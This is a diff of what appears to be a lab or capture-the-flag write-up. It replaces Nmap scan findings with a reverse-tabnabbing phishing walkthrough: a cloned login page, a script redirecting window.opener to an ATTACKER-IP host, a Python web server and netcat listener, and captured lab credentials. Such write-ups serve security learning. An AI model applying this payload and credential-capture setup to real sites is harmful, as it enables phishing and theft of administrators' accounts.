@@ -1,38 +1,43 @@
-Scan Results and Findings
-Host Availability
-The target system 192.168.56.101 responded to the scan, confirming that the host is active and reachable on the network.
-Open Ports Identified
-Port 22 – SSH
-Service: OpenSSH 8.2p1
-Protocol: TCP
-This port is running Secure Shell (SSH), which allows remote login and secure command execution on the system.
-Security Considerations:
-If weak credentials are used, it may be vulnerable to brute force attacks.
-Misconfigured SSH services could allow unauthorized access.
-Potential Attack Vectors
-Password brute force attacks
-Credential reuse
-SSH key misconfiguration
-Port 80 – HTTP
-Service: Apache HTTP Server 2.4.41
-Operating System: Ubuntu Linux
-This port hosts a web server running Apache.
-Information Discovered
-Web server version: Apache 2.4.41
-The server is running on Ubuntu Linux
-Security Considerations
-Web applications hosted on this server could contain vulnerabilities such as:
-Directory traversal
-File upload vulnerabilities
-Authentication bypass
-Local file inclusion (LFI)
-Remote code execution (RCE)
-This port will be the primary attack surface during web enumeration and exploitation.
-Operating System Detection
-The aggressive scan indicates the target is running:
-Operating System: Linux
-Kernel Version: Linux Kernel 5.x
-Environment: Oracle VirtualBox virtual machine
-This information helps attackers determine kernel exploits or privilege escalation techniques suitable for Linux systems.
-Network Distance
-The scan shows the target system is 1 hop away, indicating it is on the same local network segment as the attacker machine
+2. Exploitation Strategy
+The exploitation involved creating a malicious HTML page which redirects the original tab to a fake login page controlled by the attacker.
+Steps Performed
+The original login page was copied from the application.
+The copied login page was saved as index.html.
+This page was modified to capture credentials submitted by the victim.
+A malicious page (blog.html) was created containing a tabnabbing payload.
+Example payload:
+Copy code
+
+<script>
+window.opener.location='http://ATTACKER-IP:8000/index.html';
+</script>
+This script forces the original tab to redirect to the attacker-controlled login page.
+3. Hosting the Malicious Pages
+Two services were started on the attacker machine.
+Python Web Server
+Used to host the phishing login page.
+Example:
+Copy code
+
+sudo python3 -m http.server 80
+Netcat Listener
+Used to capture submitted credentials.
+Example:
+Copy code
+
+nc -lvnp 8000
+4. Exploitation Process
+The malicious link (blog.html) was submitted through the dashboard URL submission feature.
+The application admin reviews submitted links.
+When the admin clicked the link:
+A new tab opened with the attacker-controlled page.
+The malicious script redirected the original tab to the phishing login page.
+The admin believed they were logged out and entered their credentials again.
+The credentials were captured by the attacker.
+5. Credential Capture
+Captured credentials:
+Copy code
+
+username: daniel
+password: C0ughtm3napping123
+These credentials were successfully intercepted via the Netcat listener.
